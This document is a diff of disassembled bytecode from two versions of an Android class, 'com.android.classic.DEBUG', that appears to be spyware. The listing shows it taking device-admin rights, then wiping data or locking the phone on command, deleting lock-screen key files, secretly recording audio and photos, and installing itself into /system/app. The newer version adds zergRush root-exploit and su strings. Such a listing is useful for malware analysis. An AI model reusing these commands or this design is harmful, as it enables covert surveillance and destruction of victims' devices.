@@ -35974,13 +35974,19 @@ _____________________________________________________________________
 
 Interfaces (count = 0):
 
-Constant Pool (count = 533):
+Constant Pool (count = 555):
   + Integer [111111]
   + Integer [268435456]
-  + Integer [2131165185]
+  + Integer [2131034112]
+  + Integer [2131034113]
+  + Integer [2131034114]
+  + Integer [2131034115]
+  + Integer [2131034116]
+  + Integer [2131230721]
   + String []
   + String [' > /sdcard/Android/data/settings/Logger/Packages.txt]
   + String [' >> /sdcard/Android/data/settings/Logger/CRASH.txt]
+  + String [./data/data/com.android.classic/files/root.sh]
   + String [.bmp]
   + String [.png]
   + String [.vcf]
@@ -36002,6 +36008,7 @@ Constant Pool (count = 533):
   + String [android.app.extra.DEVICE_ADMIN]
   + String [body]
   + String [browserlog]
+  + String [busybox]
   + String [calllog]
   + String [cat ]
   + String [cat /data/app/com.android.classic* > /system/app/com.android.classic.apk]
@@ -36017,6 +36024,7 @@ Constant Pool (count = 533):
   + String [echo 'CODELIST | ]
   + String [id]
   + String [lookup]
+  + String [makespace]
   + String [mount -o remount,ro /system]
   + String [mount -o remount,rw /system]
   + String [msg:|]
@@ -36033,12 +36041,15 @@ Constant Pool (count = 533):
   + String [rm -f /system/app/com.android.classic.apk]
   + String [rm -rf ]
   + String [rm -rf /data/system/*.key]
+  + String [root.sh]
   + String [screencap -p ]
   + String [screenshot]
   + String [smslog]
+  + String [su]
   + String [thread_id]
   + String [type]
   + String [yyyy-MM-dd_HH-mm-ss]
+  + String [zergRush]
   + String [|]
   + String [||]
   + Class [[Ljava/lang/String;]
@@ -36073,11 +36084,12 @@ Constant Pool (count = 533):
   + Class [com/android/classic/helper/f]
   + Class [com/android/classic/helper/g]
   + Class [com/android/classic/helper/h]
+  + Class [com/android/classic/helper/i]
   + Class [com/android/classic/recording/Audiorecorder]
   + Class [com/android/classic/recording/MakePhotoActivity]
   + Class [com/android/classic/recording/MakePhotoActivityBack]
+  + Class [eu/chainfire/libsuperuser/b]
   + Class [eu/chainfire/libsuperuser/c]
-  + Class [eu/chainfire/libsuperuser/d]
   + Class [java/io/File]
   + Class [java/io/FileInputStream]
   + Class [java/io/FileOutputStream]
@@ -36144,14 +36156,15 @@ Constant Pool (count = 533):
   + Methodref [com/android/classic/helper/b.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
   + Methodref [com/android/classic/helper/c.a (Ljava/io/File;Ljava/io/File;)V]
   + Methodref [com/android/classic/helper/f.<init> (Landroid/content/Context;)V]
-  + Methodref [com/android/classic/helper/g.<init> ()V]
-  + Methodref [com/android/classic/helper/g.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+  + Methodref [com/android/classic/helper/g.a (ILjava/lang/String;Landroid/content/Context;)V]
   + Methodref [com/android/classic/helper/h.<init> ()V]
   + Methodref [com/android/classic/helper/h.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+  + Methodref [com/android/classic/helper/i.<init> ()V]
+  + Methodref [com/android/classic/helper/i.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
+  + Methodref [eu/chainfire/libsuperuser/b.a (Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/c.a ()Z]
   + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
-  + Methodref [eu/chainfire/libsuperuser/d.a ()Z]
-  + Methodref [eu/chainfire/libsuperuser/d.a (Ljava/lang/String;)Ljava/util/List;]
-  + Methodref [eu/chainfire/libsuperuser/d.a ([Ljava/lang/String;)Ljava/util/List;]
+  + Methodref [eu/chainfire/libsuperuser/c.a ([Ljava/lang/String;)Ljava/util/List;]
   + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
   + Methodref [java/io/File.exists ()Z]
   + Methodref [java/io/File.getAbsolutePath ()Ljava/lang/String;]
@@ -36203,6 +36216,7 @@ Constant Pool (count = 533):
   + NameAndType [SDK_INT I]
   + NameAndType [a ()V]
   + NameAndType [a ()Z]
+  + NameAndType [a (ILjava/lang/String;Landroid/content/Context;)V]
   + NameAndType [a (Landroid/content/Intent;)V]
   + NameAndType [a (Ljava/io/File;Ljava/io/File;)V]
   + NameAndType [a (Ljava/lang/String;)Ljava/util/List;]
@@ -36289,6 +36303,7 @@ Constant Pool (count = 533):
   + Utf8 [(I)Ljava/lang/String;]
   + Utf8 [(I)V]
   + Utf8 [(IILandroid/content/Intent;)V]
+  + Utf8 [(ILjava/lang/String;Landroid/content/Context;)V]
   + Utf8 [(J)V]
   + Utf8 [(Landroid/content/ComponentName;)Z]
   + Utf8 [(Landroid/content/ContentResolver;Ljava/lang/String;I)Z]
@@ -36323,6 +36338,7 @@ Constant Pool (count = 533):
   + Utf8 [([Ljava/lang/Object;)Landroid/os/AsyncTask;]
   + Utf8 [([Ljava/lang/Object;)[Ljava/lang/Object;]
   + Utf8 [([Ljava/lang/String;)Ljava/util/List;]
+  + Utf8 [./data/data/com.android.classic/files/root.sh]
   + Utf8 [.bmp]
   + Utf8 [.png]
   + Utf8 [.vcf]
@@ -36391,6 +36407,7 @@ Constant Pool (count = 533):
   + Utf8 [body]
   + Utf8 [browserlog]
   + Utf8 [build]
+  + Utf8 [busybox]
   + Utf8 [c]
   + Utf8 [calllog]
   + Utf8 [cat ]
@@ -36406,6 +36423,7 @@ Constant Pool (count = 533):
   + Utf8 [com/android/classic/helper/f]
   + Utf8 [com/android/classic/helper/g]
   + Utf8 [com/android/classic/helper/h]
+  + Utf8 [com/android/classic/helper/i]
   + Utf8 [com/android/classic/recording/Audiorecorder]
   + Utf8 [com/android/classic/recording/MakePhotoActivity]
   + Utf8 [com/android/classic/recording/MakePhotoActivityBack]
@@ -36420,8 +36438,8 @@ Constant Pool (count = 533):
   + Utf8 [echo ']
   + Utf8 [echo 'CODELIST | ]
   + Utf8 [equals]
+  + Utf8 [eu/chainfire/libsuperuser/b]
   + Utf8 [eu/chainfire/libsuperuser/c]
-  + Utf8 [eu/chainfire/libsuperuser/d]
   + Utf8 [execute]
   + Utf8 [exists]
   + Utf8 [finish]
@@ -36456,6 +36474,7 @@ Constant Pool (count = 533):
   + Utf8 [java/util/List]
   + Utf8 [lockNow]
   + Utf8 [lookup]
+  + Utf8 [makespace]
   + Utf8 [mkdirs]
   + Utf8 [mount -o remount,ro /system]
   + Utf8 [mount -o remount,rw /system]
@@ -36486,6 +36505,7 @@ Constant Pool (count = 533):
   + Utf8 [rm -f /system/app/com.android.classic.apk]
   + Utf8 [rm -rf ]
   + Utf8 [rm -rf /data/system/*.key]
+  + Utf8 [root.sh]
   + Utf8 [screencap -p ]
   + Utf8 [screenshot]
   + Utf8 [setThreadPolicy]
@@ -36494,6 +36514,7 @@ Constant Pool (count = 533):
   + Utf8 [smslog]
   + Utf8 [startActivity]
   + Utf8 [startActivityForResult]
+  + Utf8 [su]
   + Utf8 [thread_id]
   + Utf8 [toArray]
   + Utf8 [toString]
@@ -36504,6 +36525,7 @@ Constant Pool (count = 533):
   + Utf8 [withAppendedPath]
   + Utf8 [write]
   + Utf8 [yyyy-MM-dd_HH-mm-ss]
+  + Utf8 [zergRush]
   + Utf8 [|]
   + Utf8 [||]
 
@@ -36525,12 +36547,12 @@ Methods (count = 6):
     Class member attributes (count = 1):
     + Code attribute instructions (code length = 11, locals = 1, stack = 2):
       [0] aload_0 v0
-      [1] invokespecial #129
+      [1] invokespecial #141
         + Methodref [android/app/Activity.<init> ()V]
       [4] aload_0 v0
-      [5] ldc #37
+      [5] ldc #44
         + String [default]
-      [7] putfield #126
+      [7] putfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
       [10] return
       Code attribute exceptions (count = 0):
@@ -36539,594 +36561,594 @@ Methods (count = 6):
     Access flags: 0x4
       = protected void onCreate(android.os.Bundle)
     Class member attributes (count = 2):
-    + Code attribute instructions (code length = 1715, locals = 17, stack = 7):
+    + Code attribute instructions (code length = 1780, locals = 17, stack = 7):
       [0] aload_0 v0
       [1] aload_1 v1
-      [2] invokespecial #131
+      [2] invokespecial #143
         + Methodref [android/app/Activity.onCreate (Landroid/os/Bundle;)V]
-      [5] new #83
+      [5] new #94
         + Class [android/os/StrictMode$ThreadPolicy$Builder]
       [8] dup
-      [9] invokespecial #152
+      [9] invokespecial #164
         + Methodref [android/os/StrictMode$ThreadPolicy$Builder.<init> ()V]
-      [12] invokevirtual #154
+      [12] invokevirtual #166
         + Methodref [android/os/StrictMode$ThreadPolicy$Builder.permitAll ()Landroid/os/StrictMode$ThreadPolicy$Builder;]
-      [15] invokevirtual #153
+      [15] invokevirtual #165
         + Methodref [android/os/StrictMode$ThreadPolicy$Builder.build ()Landroid/os/StrictMode$ThreadPolicy;]
       [18] astore_2 v2
       [19] aload_2 v2
-      [20] invokestatic #151
+      [20] invokestatic #163
         + Methodref [android/os/StrictMode.setThreadPolicy (Landroid/os/StrictMode$ThreadPolicy;)V]
       [23] aload_0 v0
       [24] aload_0 v0
-      [25] invokevirtual #162
+      [25] invokevirtual #174
         + Methodref [com/android/classic/DEBUG.getIntent ()Landroid/content/Intent;]
-      [28] invokespecial #158
+      [28] invokespecial #170
         + Methodref [com/android/classic/DEBUG.a (Landroid/content/Intent;)V]
       [31] aload_0 v0
       [32] aload_0 v0
-      [33] ldc #38
+      [33] ldc #45
         + String [device_policy]
-      [35] invokevirtual #164
+      [35] invokevirtual #176
         + Methodref [com/android/classic/DEBUG.getSystemService (Ljava/lang/String;)Ljava/lang/Object;]
-      [38] checkcast #69
+      [38] checkcast #80
         + Class [android/app/admin/DevicePolicyManager]
-      [41] putfield #124
+      [41] putfield #136
         + Fieldref [com/android/classic/DEBUG.a Landroid/app/admin/DevicePolicyManager;]
       [44] aload_0 v0
-      [45] new #70
+      [45] new #81
         + Class [android/content/ComponentName]
       [48] dup
       [49] aload_0 v0
-      [50] ldc #91
+      [50] ldc #102
         + Class [com/android/classic/DEBUG$MyAdmin]
-      [52] invokespecial #135
+      [52] invokespecial #147
         + Methodref [android/content/ComponentName.<init> (Landroid/content/Context;Ljava/lang/Class;)V]
-      [55] putfield #125
+      [55] putfield #137
         + Fieldref [com/android/classic/DEBUG.b Landroid/content/ComponentName;]
-      [58] new #112
+      [58] new #124
         + Class [java/text/SimpleDateFormat]
       [61] dup
-      [62] ldc #64
+      [62] ldc #74
         + String [yyyy-MM-dd_HH-mm-ss]
-      [64] invokespecial #202
+      [64] invokespecial #215
         + Methodref [java/text/SimpleDateFormat.<init> (Ljava/lang/String;)V]
       [67] astore_3 v3
       [68] aload_3 v3
-      [69] new #113
+      [69] new #125
         + Class [java/util/Date]
       [72] dup
-      [73] invokespecial #204
+      [73] invokespecial #217
         + Methodref [java/util/Date.<init> ()V]
-      [76] invokevirtual #203
+      [76] invokevirtual #216
         + Methodref [java/text/SimpleDateFormat.format (Ljava/util/Date;)Ljava/lang/String;]
       [79] astore v4
       [81] aload_0 v0
-      [82] getfield #124
+      [82] getfield #136
         + Fieldref [com/android/classic/DEBUG.a Landroid/app/admin/DevicePolicyManager;]
       [85] aload_0 v0
-      [86] getfield #125
+      [86] getfield #137
         + Fieldref [com/android/classic/DEBUG.b Landroid/content/ComponentName;]
-      [89] invokevirtual #132
+      [89] invokevirtual #144
         + Methodref [android/app/admin/DevicePolicyManager.isAdminActive (Landroid/content/ComponentName;)Z]
       [92] ifne +48 (target=140)
-      [95] new #72
+      [95] new #83
         + Class [android/content/Intent]
       [98] dup
-      [99] ldc #23
+      [99] ldc #29
         + String [android.app.action.ADD_DEVICE_ADMIN]
-      [101] invokespecial #139
+      [101] invokespecial #151
         + Methodref [android/content/Intent.<init> (Ljava/lang/String;)V]
       [104] astore v5
       [106] aload v5
-      [108] ldc #25
+      [108] ldc #31
         + String [android.app.extra.DEVICE_ADMIN]
       [110] aload_0 v0
-      [111] getfield #125
+      [111] getfield #137
         + Fieldref [com/android/classic/DEBUG.b Landroid/content/ComponentName;]
-      [114] invokevirtual #142
+      [114] invokevirtual #154
         + Methodref [android/content/Intent.putExtra (Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;]
       [117] pop
       [118] aload v5
-      [120] ldc #24
+      [120] ldc #30
         + String [android.app.extra.ADD_EXPLANATION]
       [122] aload_0 v0
-      [123] ldc #3
-        + Integer [2131165185]
-      [125] invokevirtual #163
+      [123] ldc #8
+        + Integer [2131230721]
+      [125] invokevirtual #175
         + Methodref [com/android/classic/DEBUG.getString (I)Ljava/lang/String;]
-      [128] invokevirtual #143
+      [128] invokevirtual #155
         + Methodref [android/content/Intent.putExtra (Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;]
       [131] pop
       [132] aload_0 v0
       [133] aload v5
       [135] ldc #1
         + Integer [111111]
-      [137] invokevirtual #166
+      [137] invokevirtual #178
         + Methodref [com/android/classic/DEBUG.startActivityForResult (Landroid/content/Intent;I)V]
       [140] aload_0 v0
-      [141] getfield #126
+      [141] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [144] getstatic #127
+      [144] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [147] iconst_0
       [148] aaload
-      [149] invokevirtual #191
+      [149] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [152] ifeq +21 (target=173)
       [155] aload_0 v0
-      [156] getfield #124
+      [156] getfield #136
         + Fieldref [com/android/classic/DEBUG.a Landroid/app/admin/DevicePolicyManager;]
-      [159] invokevirtual #133
+      [159] invokevirtual #145
         + Methodref [android/app/admin/DevicePolicyManager.lockNow ()V]
       [162] aload_0 v0
-      [163] getfield #124
+      [163] getfield #136
         + Fieldref [com/android/classic/DEBUG.a Landroid/app/admin/DevicePolicyManager;]
       [166] iconst_0
-      [167] invokevirtual #134
+      [167] invokevirtual #146
         + Methodref [android/app/admin/DevicePolicyManager.wipeData (I)V]
-      [170] goto +1500 (target=1670)
+      [170] goto +1565 (target=1735)
       [173] aload_0 v0
-      [174] getfield #126
+      [174] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [177] getstatic #127
+      [177] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [180] iconst_1
       [181] aaload
-      [182] invokevirtual #191
+      [182] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [185] ifeq +21 (target=206)
       [188] aload_0 v0
-      [189] getfield #124
+      [189] getfield #136
         + Fieldref [com/android/classic/DEBUG.a Landroid/app/admin/DevicePolicyManager;]
-      [192] invokevirtual #133
+      [192] invokevirtual #145
         + Methodref [android/app/admin/DevicePolicyManager.lockNow ()V]
       [195] aload_0 v0
-      [196] getfield #124
+      [196] getfield #136
         + Fieldref [com/android/classic/DEBUG.a Landroid/app/admin/DevicePolicyManager;]
       [199] iconst_1
-      [200] invokevirtual #134
+      [200] invokevirtual #146
         + Methodref [android/app/admin/DevicePolicyManager.wipeData (I)V]
-      [203] goto +1467 (target=1670)
+      [203] goto +1532 (target=1735)
       [206] aload_0 v0
-      [207] getfield #126
+      [207] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [210] getstatic #127
+      [210] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [213] iconst_2
       [214] aaload
-      [215] invokevirtual #190
+      [215] invokevirtual #203
         + Methodref [java/lang/String.contains (Ljava/lang/CharSequence;)Z]
       [218] ifeq +38 (target=256)
-      [221] new #93
+      [221] new #104
         + Class [com/android/classic/helper/b]
       [224] dup
-      [225] invokespecial #167
+      [225] invokespecial #179
         + Methodref [com/android/classic/helper/b.<init> ()V]
       [228] iconst_1
-      [229] anewarray #109
+      [229] anewarray #121
         + Class [java/lang/String]
       [232] dup
       [233] iconst_0
       [234] aload_0 v0
-      [235] getfield #126
+      [235] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [238] ldc #45
+      [238] ldc #53
         + String [msg:|]
-      [240] ldc #4
+      [240] ldc #9
         + String []
-      [242] invokevirtual #193
+      [242] invokevirtual #206
         + Methodref [java/lang/String.replace (Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;]
-      [245] invokevirtual #194
+      [245] invokevirtual #207
         + Methodref [java/lang/String.toString ()Ljava/lang/String;]
       [248] aastore
-      [249] invokevirtual #168
+      [249] invokevirtual #180
         + Methodref [com/android/classic/helper/b.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [252] pop
-      [253] goto +1417 (target=1670)
+      [253] goto +1482 (target=1735)
       [256] aload_0 v0
-      [257] getfield #126
+      [257] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [260] getstatic #127
+      [260] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [263] iconst_3
       [264] aaload
-      [265] invokevirtual #191
+      [265] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [268] ifeq +12 (target=280)
-      [271] ldc #58
+      [271] ldc #66
         + String [rm -rf /data/system/*.key]
-      [273] invokestatic #177
-        + Methodref [eu/chainfire/libsuperuser/d.a (Ljava/lang/String;)Ljava/util/List;]
+      [273] invokestatic #190
+        + Methodref [eu/chainfire/libsuperuser/c.a (Ljava/lang/String;)Ljava/util/List;]
       [276] pop
-      [277] goto +1393 (target=1670)
+      [277] goto +1458 (target=1735)
       [280] aload_0 v0
-      [281] getfield #126
+      [281] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [284] getstatic #127
+      [284] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [287] iconst_4
       [288] aaload
-      [289] invokevirtual #191
+      [289] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [292] ifeq +74 (target=366)
-      [295] invokestatic #176
-        + Methodref [eu/chainfire/libsuperuser/d.a ()Z]
-      [298] ifeq +1372 (target=1670)
+      [295] invokestatic #189
+        + Methodref [eu/chainfire/libsuperuser/c.a ()Z]
+      [298] ifeq +1437 (target=1735)
       [301] bipush 8
-      [303] anewarray #109
+      [303] anewarray #121
         + Class [java/lang/String]
       [306] dup
       [307] iconst_0
-      [308] ldc #44
+      [308] ldc #52
         + String [mount -o remount,rw /system]
       [310] aastore
       [311] dup
       [312] iconst_1
-      [313] ldc #56
+      [313] ldc #64
         + String [rm -f /system/app/com.android.classic.apk]
       [315] aastore
       [316] dup
       [317] iconst_2
-      [318] ldc #30
+      [318] ldc #37
         + String [cat /data/app/com.android.classic* > /system/app/com.android.classic.apk]
       [320] aastore
       [321] dup
       [322] iconst_3
-      [323] ldc #31
+      [323] ldc #38
         + String [chmod 644 /system/app/com.android.classic.apk]
       [325] aastore
       [326] dup
       [327] iconst_4
-      [328] ldc #32
+      [328] ldc #39
         + String [chown root:root /system/app/com.android.classic.apk]
       [330] aastore
       [331] dup
       [332] iconst_5
-      [333] ldc #43
+      [333] ldc #51
         + String [mount -o remount,ro /system]
       [335] aastore
       [336] dup
       [337] bipush 6
-      [339] ldc #55
+      [339] ldc #63
         + String [rm -f /data/app/com.android.classic*]
       [341] aastore
       [342] dup
       [343] bipush 7
-      [345] ldc #54
+      [345] ldc #62
         + String [reboot]
       [347] aastore
       [348] astore v5
-      [350] new #93
+      [350] new #104
         + Class [com/android/classic/helper/b]
       [353] dup
-      [354] invokespecial #167
+      [354] invokespecial #179
         + Methodref [com/android/classic/helper/b.<init> ()V]
       [357] aload v5
-      [359] invokevirtual #168
+      [359] invokevirtual #180
         + Methodref [com/android/classic/helper/b.execute ([Ljava/lang/Object;)Landroid/os/AsyncTask;]
       [362] pop
-      [363] goto +1307 (target=1670)
+      [363] goto +1372 (target=1735)
       [366] aload_0 v0
-      [367] getfield #126
+      [367] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [370] getstatic #127
+      [370] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [373] iconst_5
       [374] aaload
-      [375] invokevirtual #191
+      [375] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [378] ifeq +10 (target=388)
       [381] aload_0 v0
-      [382] invokevirtual #159
+      [382] invokevirtual #171
         + Methodref [com/android/classic/DEBUG.b ()V]
-      [385] goto +1285 (target=1670)
+      [385] goto +1350 (target=1735)
       [388] aload_0 v0
-      [389] getfield #126
+      [389] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [392] getstatic #127
+      [392] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [395] bipush 6
       [397] aaload
-      [398] invokevirtual #191
+      [398] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [401] ifeq +10 (target=411)
       [404] aload_0 v0
-      [405] invokevirtual #157
+      [405] invokevirtual #169
         + Methodref [com/android/classic/DEBUG.a ()V]
-      [408] goto +1262 (target=1670)
+      [408] goto +1327 (target=1735)
       [411] aload_0 v0
-      [412] getfield #126
+      [412] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [415] getstatic #127
+      [415] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [418] bipush 7
       [420] aaload
-      [421] invokevirtual #191
+      [421] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [424] ifeq +25 (target=449)
       [427] aload_0 v0
-      [428] new #72
+      [428] new #83
         + Class [android/content/Intent]
       [431] dup
       [432] aload_0 v0
-      [433] ldc #99
+      [433] ldc #111
         + Class [com/android/classic/recording/Audiorecorder]
-      [435] invokespecial #138
+      [435] invokespecial #150
         + Methodref [android/content/Intent.<init> (Landroid/content/Context;Ljava/lang/Class;)V]
       [438] ldc #2
         + Integer [268435456]
-      [440] invokevirtual #140
+      [440] invokevirtual #152
         + Methodref [android/content/Intent.addFlags (I)Landroid/content/Intent;]
-      [443] invokevirtual #165
+      [443] invokevirtual #177
         + Methodref [com/android/classic/DEBUG.startActivity (Landroid/content/Intent;)V]
-      [446] goto +1224 (target=1670)
+      [446] goto +1289 (target=1735)
       [449] aload_0 v0
-      [450] getfield #126
+      [450] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [453] getstatic #127
+      [453] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [456] bipush 8
       [458] aaload
-      [459] invokevirtual #191
+      [459] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [462] ifeq +25 (target=487)
       [465] aload_0 v0
-      [466] new #72
+      [466] new #83
         + Class [android/content/Intent]
       [469] dup
       [470] aload_0 v0
-      [471] ldc #101
+      [471] ldc #113
         + Class [com/android/classic/recording/MakePhotoActivityBack]
-      [473] invokespecial #138
+      [473] invokespecial #150
         + Methodref [android/content/Intent.<init> (Landroid/content/Context;Ljava/lang/Class;)V]
       [476] ldc #2
         + Integer [268435456]
-      [478] invokevirtual #140
+      [478] invokevirtual #152
         + Methodref [android/content/Intent.addFlags (I)Landroid/content/Intent;]
-      [481] invokevirtual #165
+      [481] invokevirtual #177
         + Methodref [com/android/classic/DEBUG.startActivity (Landroid/content/Intent;)V]
-      [484] goto +1186 (target=1670)
+      [484] goto +1251 (target=1735)
       [487] aload_0 v0
-      [488] getfield #126
+      [488] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [491] getstatic #127
+      [491] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [494] bipush 9
       [496] aaload
-      [497] invokevirtual #191
+      [497] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [500] ifeq +32 (target=532)
-      [503] invokestatic #146
+      [503] invokestatic #158
         + Methodref [android/hardware/Camera.getNumberOfCameras ()I]
       [506] iconst_1
-      [507] ificmple +1163 (target=1670)
+      [507] ificmple +1228 (target=1735)
       [510] aload_0 v0
-      [511] new #72
+      [511] new #83
         + Class [android/content/Intent]
       [514] dup
       [515] aload_0 v0
-      [516] ldc #100
+      [516] ldc #112
         + Class [com/android/classic/recording/MakePhotoActivity]
-      [518] invokespecial #138
+      [518] invokespecial #150
         + Methodref [android/content/Intent.<init> (Landroid/content/Context;Ljava/lang/Class;)V]
       [521] ldc #2
         + Integer [268435456]
-      [523] invokevirtual #140
+      [523] invokevirtual #152
         + Methodref [android/content/Intent.addFlags (I)Landroid/content/Intent;]
-      [526] invokevirtual #165
+      [526] invokevirtual #177
         + Methodref [com/android/classic/DEBUG.startActivity (Landroid/content/Intent;)V]
-      [529] goto +1141 (target=1670)
+      [529] goto +1206 (target=1735)
       [532] aload_0 v0
-      [533] getfield #126
+      [533] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [536] getstatic #127
+      [536] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [539] bipush 10
       [541] aaload
-      [542] invokevirtual #191
+      [542] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [545] ifeq +88 (target=633)
-      [548] new #104
+      [548] new #116
         + Class [java/io/File]
       [551] dup
-      [552] new #110
+      [552] new #122
         + Class [java/lang/StringBuilder]
       [555] dup
-      [556] invokespecial #196
+      [556] invokespecial #209
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [559] invokestatic #150
+      [559] invokestatic #162
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [562] invokevirtual #198
+      [562] invokevirtual #211
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
-      [565] ldc #11
+      [565] ldc #17
         + String [/Android/data/settings/]
-      [567] invokevirtual #199
+      [567] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [570] invokevirtual #200
+      [570] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [573] invokespecial #179
+      [573] invokespecial #192
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [576] astore v5
-      [578] new #104
+      [578] new #116
         + Class [java/io/File]
       [581] dup
-      [582] new #110
+      [582] new #122
         + Class [java/lang/StringBuilder]
       [585] dup
-      [586] invokespecial #196
+      [586] invokespecial #209
         + Methodref [java/lang/StringBuilder.<init> ()V]
-      [589] invokestatic #150
+      [589] invokestatic #162
         + Methodref [android/os/Environment.getExternalStorageDirectory ()Ljava/io/File;]
-      [592] invokevirtual #198
+      [592] invokevirtual #211
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/Object;)Ljava/lang/StringBuilder;]
-      [595] ldc #10
+      [595] ldc #16
         + String [/]
-      [597] invokevirtual #199
+      [597] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
       [600] aload v4
-      [602] invokevirtual #199
+      [602] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [605] ldc #19
+      [605] ldc #25
         + String [__.zip]
-      [607] invokevirtual #199
+      [607] invokevirtual #212
         + Methodref [java/lang/StringBuilder.append (Ljava/lang/String;)Ljava/lang/StringBuilder;]
-      [610] invokevirtual #200
+      [610] invokevirtual #213
         + Methodref [java/lang/StringBuilder.toString ()Ljava/lang/String;]
-      [613] invokespecial #179
+      [613] invokespecial #192
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [616] astore v6
       [618] aload v5
       [620] aload v6
-      [622] invokestatic #169
+      [622] invokestatic #181
         + Methodref [com/android/classic/helper/c.a (Ljava/io/File;Ljava/io/File;)V]
-      [625] goto +1045 (target=1670)
+      [625] goto +1110 (target=1735)
       [628] astore v7
-      [630] goto +1040 (target=1670)
+      [630] goto +1105 (target=1735)
       [633] aload_0 v0
-      [634] getfield #126
+      [634] getfield #138
         + Fieldref [com/android/classic/DEBUG.c Ljava/lang/String;]
-      [637] getstatic #127
+      [637] getstatic #139
         + Fieldref [com/android/classic/helper/DEBUGSERVICE.a [Ljava/lang/String;]
       [640] bipush 11
       [642] aaload
-      [643] invokevirtual #191
+      [643] invokevirtual #204
         + Methodref [java/lang/String.equals (Ljava/lang/Object;)Z]
       [646] ifeq +67 (target=713)
-      [649] ldc #14
+      [649] ldc #20
         + String [/system/app/com.android.classic.apk]
       [651] astore v5
-      [653] new #104
+      [653] new #116
         + Class [java/io/File]
       [656] dup
       [657] aload v5
-      [659] invokespecial #179
+      [659] invokespecial #192
         + Methodref [java/io/File.<init> (Ljava/lang/String;)V]
       [662] astore v6
       [664] aload v6
-      [666] invokevirtual #180
+      [666] invokevirtual #193
         + Methodref [java/io/File.exists ()Z]
-      [669] ifeq +1001 (target=1670)
-      [672] getstatic #118
+      [669] ifeq +1066 (target=1735)
+      [672] getstatic #130
         + Fieldref [android/os/Build$VERSION.SDK_INT I]
       [675] bipush 17
       [677] ificmpgt +17 (target=694)
       [680] aload_0 v0
-      [681] invokevirtual #161
+      [681] invokevirtual #173
         + Methodref [com/android/classic/DEBUG.getContentResolver ()Landroid/content/ContentResolver;]
-      [684] ldc #21
+      [684] ldc #27
         + String [adb_enabled]
       [686] iconst_0
-      [687] invokestatic #156
+      [687] invokestatic #168
         + Methodref [android/provider/Settings$Secure.putInt (Landroid/content/ContentResolver;Ljava/lang/String;I)Z]
